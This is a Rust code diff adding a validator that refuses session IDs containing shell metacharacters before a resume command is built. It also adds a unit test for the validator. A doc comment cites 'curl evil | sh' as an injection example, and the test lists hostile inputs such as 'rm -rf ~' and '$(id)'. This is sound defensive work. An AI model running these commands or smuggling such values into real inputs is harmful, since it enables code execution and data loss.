@@ -55,6 +55,21 @@ pub struct DeleteSessionOutcome {
     pub error: Option<String>,
 }
 
+/// Build a CLI resume command for a session, or `None` if the session ID is
+/// not a plain token.
+///
+/// Session IDs are read from on-disk session files, and the resulting command
+/// is later executed through a shell when the user clicks "resume" — so an ID
+/// like `x; curl evil | sh` must never be interpolated. Real IDs (UUIDs,
+/// `ses_…`, etc.) only use ASCII alphanumerics, `-`, `_` and `.`.
+pub(crate) fn build_resume_command(prefix: &str, session_id: &str) -> Option<String> {
+    let safe = !session_id.is_empty()
+        && session_id
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'));
+    safe.then(|| format!("{prefix} {session_id}"))
+}
+
 pub fn scan_sessions() -> Vec<SessionMeta> {
     let (r1, r2, r3, r4, r5, r6, r7) = std::thread::scope(|s| {
         let h1 = s.spawn(codex::scan_sessions);
@@ -257,6 +272,17 @@ where
 mod tests {
     use super::*;
     use tempfile::tempdir;
+
+    #[test]
+    fn resume_command_rejects_shell_metacharacters_in_session_id() {
+        assert_eq!(
+            build_resume_command("claude --resume", "0b6f-4c1e_ses.1").as_deref(),
+            Some("claude --resume 0b6f-4c1e_ses.1")
+        );
+        for bad in ["", "x; rm -rf ~", "$(id)", "a`id`", "a b", "a|b", "a\nb"] {
+            assert_eq!(build_resume_command("claude --resume", bad), None, "{bad}");
+        }
+    }
 
     fn write_codex_session(path: &Path, session_id: &str) {
         std::fs::write(
